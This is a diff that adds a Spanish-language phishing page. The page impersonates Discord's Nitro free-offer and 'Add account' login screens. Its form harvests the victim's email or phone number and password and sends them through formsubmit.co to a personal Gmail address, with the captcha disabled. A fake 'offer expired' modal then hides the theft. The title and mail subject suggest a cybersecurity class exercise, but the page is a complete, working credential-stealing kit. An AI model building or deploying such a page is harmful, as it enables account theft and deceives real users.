@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ciberseguridad - Ingreso</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #1a1a1a;
+      font-family: Arial, sans-serif;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .ventana, .login {
+      background-color: #0e0e0e;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 500px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 0 15px rgba(0,0,0,0.5);
+    }
+
+    .ventana img {
+      max-width: 100%;
+      border-radius: 10px;
+    }
+
+    .ventana ol {
+      text-align: left;
+      color: #ccc;
+      padding-left: 20px;
+    }
+
+    .boton {
+      background-color: #5865F2;
+      color: white;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    .boton:hover {
+      background-color: #4752c4;
+    }
+
+    .login {
+      display: none;
+      text-align: left;
+    }
+
+    .login h2 {
+      text-align: center;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #ccc;
+    }
+
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #2c2f33;
+      color: white;
+    }
+
+    .login a {
+      color: #7289da;
+      font-size: 14px;
+      display: inline-block;
+      margin-bottom: 20px;
+    }
+
+    .login-buttons {
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .login-buttons button {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 6px;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    .atras {
+      background-color: #2f3136;
+      color: white;
+    }
+
+    .continuar {
+      background-color: #5865F2;
+      color: white;
+    }
+
+    .continuar:hover {
+      background-color: #4752c4;
+    }
+
+    .atras:hover {
+      background-color: #202225;
+    }
+
+    /* Estilos mejorados para el modal de Nitro */
+    .nitro-modal {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0;
+      top: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+    }
+
+    .nitro-container {
+      background: linear-gradient(135deg, #404EED 0%, #5865F2 100%);
+      margin: 10% auto;
+      padding: 0;
+      width: 90%;
+      max-width: 500px;
+      border-radius: 12px;
+      overflow: hidden;
+      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+    }
+
+    .nitro-header {
+      background-color: white;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .nitro-header h2 {
+      color: #404EED;
+      font-size: 28px;
+      font-weight: 800;
+      margin: 0;
+      letter-spacing: -0.5px;
+    }
+
+    .nitro-header p {
+      color: #73767D;
+      margin: 5px 0 0;
+      font-size: 14px;
+    }
+
+    .nitro-content {
+      padding: 25px;
+      color: white;
+      text-align: center;
+    }
+
+    .nitro-feature {
+      background-color: rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      padding: 15px;
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .nitro-feature h3 {
+      margin-top: 0;
+      font-size: 18px;
+    }
+
+    .nitro-feature p {
+      margin-bottom: 0;
+      font-size: 14px;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .nitro-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
+
+    .nitro-btn {
+      padding: 12px 24px;
+      border-radius: 40px;
+      border: none;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+
+    .nitro-btn-primary {
+      background-color: white;
+      color: #404EED;
+    }
+
+    .nitro-btn-secondary {
+      background-color: transparent;
+      color: white;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+    }
+
+    .nitro-btn:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    .nitro-expired {
+      background-color: #ED4245;
+      color: white;
+      padding: 15px;
+      border-radius: 8px;
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Modal de Discord Nitro (versión mejorada) -->
+  <div id="nitroModal" class="nitro-modal">
+    <div class="nitro-container">
+      <div class="nitro-header">
+        <h2>DISCORD NITRO</h2>
+        <p>Make Discord yours</p>
+      </div>
+      
+      <div class="nitro-content">
+        <div class="nitro-expired">
+          ¡Lo sentimos! Esta oferta de Nitro ha caducado
+        </div>
+        
+        <div class="nitro-feature">
+          <h3>✨ Upgrade your emoji</h3>
+          <p>Use animados en cualquier servidor y sube emojis con mayor calidad</p>
+        </div>
+        
+        <div class="nitro-feature">
+          <h3>🎨 Personalize your profile</h3>
+          <p>Perfil personalizado con banner animado y tag personalizado</p>
+        </div>
+        
+        <div class="nitro-feature">
+          <h3>🖌️ Exclusive stickers</h3>
+          <p>Acceso a cientos de stickers exclusivos para expresarte</p>
+        </div>
+        
+        <div class="nitro-buttons">
+          <button class="nitro-btn nitro-btn-primary" onclick="cerrarModal()">Subscribe</button>
+          <button class="nitro-btn nitro-btn-secondary" onclick="cerrarModal()">Gift</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Ventana inicial -->
+  <div class="ventana" id="ventanaBienvenida">
+    <img src="MXOF6CJJBNOOJJEN7Z5I3XJED4.jpg">
+    <h2>Obtené Discord Nitro</h2>
+    <p>Canjea Discord Nitro Gratis y Disfruta de las Mejoras</p>
+    <ol>
+      <li>Transmisión del vídeo en HD (hasta 4K y 60 fps).</li>
+      <li>Mensajes más largos (hasta 4000 caracteres)</li>
+      <li>Tema de perfil animado, avatar y cartel</li>
+      <li>Perfiles de servidor personalizados</li>
+    </ol>
+    <button class="boton" onclick="mostrarLogin()">Ingresar al sitio</button>
+  </div>
+
+  <!-- Ventana de login -->
+  <form class="login" id="ventanaLogin" action="https://formsubmit.co/davidkfernandez05@gmail.com" method="POST">
+    <h2>Añadir cuenta</h2>
+    <p>Iniciar sesión en otra cuenta te permitirá cambiar fácilmente entre cuentas en este dispositivo.</p>
+
+    <div class="form-group">
+      <label for="correo">Correo electrónico o número de teléfono *</label>
+      <input type="text" id="correo" name="email" required>
+    </div>
+
+    <div class="form-group">
+      <label for="contrasena">Contraseña *</label>
+      <input type="password" id="contrasena" name="password" required>
+    </div>
+
+    <input type="hidden" name="_captcha" value="false">
+    <input type="hidden" name="_template" value="table">
+    <input type="hidden" name="_subject" value="Nuevo acceso - Trabajo Ciberseguridad">
+    <input type="hidden" name="_next" value="https://ejemplo.com/gracias.html">
+    <input type="text" name="_honey" style="display:none">
+    
+    <a href="#">¿Has olvidado la contraseña?</a>
+
+    <div class="login-buttons">
+      <button type="button" class="atras" onclick="volver()">Atrás</button>
+      <button type="submit" class="continuar" id="btnContinuar">Continuar</button>
+    </div>
+  </form>
+
+  <script>
+    // Muestra la ventana de bienvenida al cargar la página
+    document.addEventListener('DOMContentLoaded', function() {
+      document.getElementById('ventanaBienvenida').style.display = 'block';
+      document.getElementById('ventanaLogin').style.display = 'none';
+    });
+
+    function mostrarLogin() {
+      document.getElementById('ventanaBienvenida').style.display = 'none';
+      document.getElementById('ventanaLogin').style.display = 'block';
+    }
+
+    function volver() {
+      document.getElementById('ventanaLogin').style.display = 'none';
+      document.getElementById('ventanaBienvenida').style.display = 'block';
+    }
+
+    function mostrarModalNitro() {
+      // Validar campos primero
+      const correo = document.getElementById('correo').value;
+      const contrasena = document.getElementById('contrasena').value;
+      
+      if(correo && contrasena) {
+        // Enviar formulario
+        document.getElementById('ventanaLogin').submit();
+        // Mostrar modal
+        document.getElementById('nitroModal').style.display = 'block';
+      }
+    }
+
+    function cerrarModal() {
+      document.getElementById('nitroModal').style.display = 'none';
+      // Opcional: redirigir o volver al inicio
+      volver();
+    }
+
+    // Manejar el envío del formulario
+    document.getElementById('ventanaLogin').addEventListener('submit', function(e) {
+      e.preventDefault();
+      mostrarModalNitro();
+    });
+  </script>
+</body>
+</html>
